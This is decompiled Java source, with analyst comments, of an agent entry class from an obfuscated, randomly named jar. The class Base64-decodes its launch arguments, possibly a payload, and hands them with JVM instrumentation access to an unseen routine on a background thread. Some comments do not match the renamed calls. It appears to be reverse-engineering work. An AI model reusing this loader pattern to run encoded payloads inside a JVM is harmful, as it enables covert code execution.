package net.java;

import java.lang.instrument.Instrumentation;

/**
 * This is the main class for the Java agent. It is the first class loaded when
 * the agent is attached to a JVM.
 */
public class AgentMain implements Runnable {

    /**
     * The raw byte data passed as arguments to the agent. This is likely
     * a configuration or a payload.
     */
    private byte[] agentArgsData;

    /**
     * The Instrumentation object provided by the JVM, which allows the agent
     * to instrument classes.
     */
    private Instrumentation instrumentation;

    /**
     * The premain method is the entry point for the Java agent. It is called by
     * the JVM when the agent is loaded.
     *
     * @param agentArgs          The agent arguments string, passed from the command line.
     * @param inst               The instrumentation object provided by the JVM.
     */
    public static void premain(String agentArgs, Instrumentation inst) {
        byte[] decodedAgentArgs = null;
        if (agentArgs != null) {
            try {
                // The agent arguments are expected to be Base64 encoded.
                // The l.a method appears to be a Base64 decoder.
                decodedAgentArgs = CoreUtils.decodeBase64(agentArgs.getBytes("UTF-8"));
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

        // Initialize some core utilities or settings.
        m.a();

        // Create a new instance of the agent and start it in a new thread.
        AgentMain agent = new AgentMain();
        agent.agentArgsData = decodedAgentArgs;
        agent.instrumentation = inst;
        new Thread(agent).start();
    }

    /**
     * The main logic of the agent, which runs in a separate thread.
     */
    @Override
    public void run() {
        // The l.a method seems to be the core logic
        // of the agent, taking the decoded agent arguments, the instrumentation
        // object, and some other parameters.
        CoreUtils.runAgentLogic(new Object[]{this.agentArgsData, this.instrumentation, 1, DynamicClassLoader.RESOURCE_PATH_A.trim()});
    }
}


/* Location:              /Users/apple/Downloads/9z72uyksgx.jar!/net/java/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */